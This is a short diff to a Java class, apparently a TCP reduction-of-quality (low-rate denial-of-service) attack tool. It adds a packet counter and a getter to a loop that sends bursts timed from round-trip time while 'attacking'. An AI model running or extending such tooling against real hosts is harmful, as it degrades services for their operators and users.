@@ -25,6 +25,7 @@ public class TCPRoQ {
 	private int duration;			// t
 	private int timeout;			// T - t
 	private float aggression;		// M
+	private long packCount = 0;
 	
 
 	//Internals
@@ -77,7 +78,6 @@ public class TCPRoQ {
 					*/
 					int c = random.nextInt(12);					
 					OutputStream out = socket.getOutputStream();
-					long l = 0;
 					while (socket.isConnected() && attacking) {
 						//calculate the period for this attack round (in ms).
 						period = (RTT * ((8 + (int) Math.ceil(Math.sin(c / 12f) * 12)) + (2 - random.nextInt(4))));
@@ -105,7 +105,7 @@ public class TCPRoQ {
 							
 							//clear the input buffer
 							socket.getInputStream().skip(socket.getInputStream().available());
-							System.out.println(String.valueOf(++l) + ": Packet sent");
+							System.out.println(String.valueOf(++packCount) + ": Packet sent");
 						}
 						
 						//sleep for the timeout
@@ -120,6 +120,10 @@ public class TCPRoQ {
 	
 	public static void setRTT(final int r) {
 		RTT = r;
+	}
+	
+	public long getPacketsSent() {
+		return packCount;
 	}
 	
 	public static class Builder {
